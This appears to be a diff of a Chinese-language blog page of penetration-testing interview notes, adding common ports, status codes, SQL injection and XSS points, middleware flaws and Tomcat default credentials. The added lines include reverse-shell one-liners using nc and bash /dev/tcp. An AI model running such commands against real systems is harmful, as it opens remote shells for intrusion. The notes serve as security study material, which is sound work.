@@ -264,6 +264,14 @@
 <p>http：明文传输</p>
 <p>https：密文传输，端口是443</p>
 <p>为啥是三次握手</p>
+<p>常见端口：</p>
+<p>IIS：80<br>SQLServer：1433<br>Oracle：1521<br>MySQL：3306<br>FTP：21<br>SSH：22<br>Tomcat：8080<br>webshpere管理工具，默认的端口号为9090；<br>JBOSS，默认的端口号为8080；</p>
+<p>状态码：</p>
+<p>302：跳转</p>
+<p>403：没有权限访问此站</p>
+<p>404：指所请求的页面不存在、已被删除或无法访问</p>
+<p>502：服务器错误、网关错误</p>
+<p>常见数据库：sqlserver、mysql、orcale、access</p>
 <h2 id="owasp"><a href="#owasp" class="headerlink" title="owasp"></a>owasp</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><ol>
 <li><p>SQL注入的分类有哪些</p>
 <ol>
@@ -277,8 +285,6 @@
 <ol>
 <li>判断有无注入、判断字段（order by）、union select、拿到库名、字段名、表名</li>
 </ol>
-</li>
-<li><p>宽字节注入<br>1. </p>
 </li>
 <li><p>cookie注入</p>
 </li>
@@ -333,7 +339,10 @@
 <h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><ol>
 <li>xss有哪三种：dom型、存储型、反射型</li>
 <li>dom型和存储型的区别：</li>
-<li>xss的httponly绕过方法（httponly可阻止获取cookie）</li>
+<li>xss的httponly绕过方法（httponly可阻止js代码获取cookie）<ol>
+<li>phpinfo绕过</li>
+</ol>
+</li>
 </ol>
 <h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><ol>
 <li><p>文件上传能够拿到shell的限制条件</p>
@@ -474,7 +483,41 @@
 </ol>
 <p>不出网的打法</p>
 <p>linux下常用啥进行反弹shell，windows自带的反弹shell方式（除了powershell还有啥）</p>
+<p>linux ：nc（ nc -e ip port &#x2F;bin&#x2F;bash） 、bash （ bash -i &gt;&amp; dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1）、python、php、perl</p>
+<p>windows：msbuild</p>
 <p>中间件漏洞</p>
+<ol>
+<li><p>iis</p>
+<ol>
+<li>解析漏洞：IIS会默认将<code>*.asp;.jpg</code> 此种格式的文件名，当成Asp解析</li>
+<li>put漏洞</li>
+</ol>
+</li>
+<li><p>apache</p>
+<ol>
+<li>目录遍历</li>
+<li>换行解析</li>
+<li>未知扩展名解析：Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析</li>
+</ol>
+</li>
+<li><p>nginx</p>
+<ol>
+<li><p>文件解析</p>
+<img src="/2022/04/23/22423%E4%BA%8C/image-20220605235645230.png" alt="image-20220605235645230" style="zoom:80%;">
+</li>
+<li><p>目录遍历</p>
+</li>
+<li><p>CRLF注入漏洞（Nginx将传入的url进行解码，对其中的%0a%0d替换成换行符，导致后面的数据注入至头部，造成CRLF注入漏洞。）</p>
+<img src="/2022/04/23/22423%E4%BA%8C/image-20220605235818043.png" alt="image-20220605235818043" style="zoom:80%;"></li>
+</ol>
+</li>
+<li><p>tomcat</p>
+<ol>
+<li>弱口令|上传war包（tomcat&#x2F;tomcat）</li>
+<li>远程代码执行</li>
+</ol>
+</li>
+</ol>
 <p>未授权访问漏洞</p>
 
         </div>		
